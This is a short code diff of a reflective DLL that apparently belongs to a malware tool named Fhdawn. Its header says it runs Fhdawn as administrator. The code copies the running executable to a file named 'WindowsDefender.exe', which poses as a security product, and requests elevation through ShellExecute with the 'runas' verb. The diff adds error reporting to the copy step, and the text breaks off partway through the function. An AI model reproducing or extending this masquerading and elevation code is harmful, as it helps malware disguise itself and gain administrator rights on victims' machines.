@@ -1,18 +1,26 @@
 //===============================================================================================//
-// This DLL will execute Metasploit Shellcode
+// This DLL will execute Fhdawn as administrator
 //===============================================================================================//
 
 #include "ReflectiveLoader.h"
 #include "FileTunnel.h"
 #include <shellapi.h>
+
 void UACTrigger() {
     TCHAR DIR[MAX_PATH];
+    char err[200];
     GetModuleFileName(NULL, DIR, MAX_PATH);
 
     SHELLEXECUTEINFO sei = {sizeof(sei)};
 
     WriteOutput("Copying to WindowsDefender.exe\n");
-    CopyFile( DIR , "WindowsDefender.exe", FALSE );
+    if(!CopyFile( DIR , "WindowsDefender.exe", FALSE ))
+    {
+        memset(err, 0, 200);
+        snprintf(err, 200,"\nError : %i\n", GetLastError());
+        WriteOutput("Error Copying file!");
+        WriteOutput(err);
+    }
 
     sei.lpVerb = "runas";
     sei.lpFile = "WindowsDefender.exe";
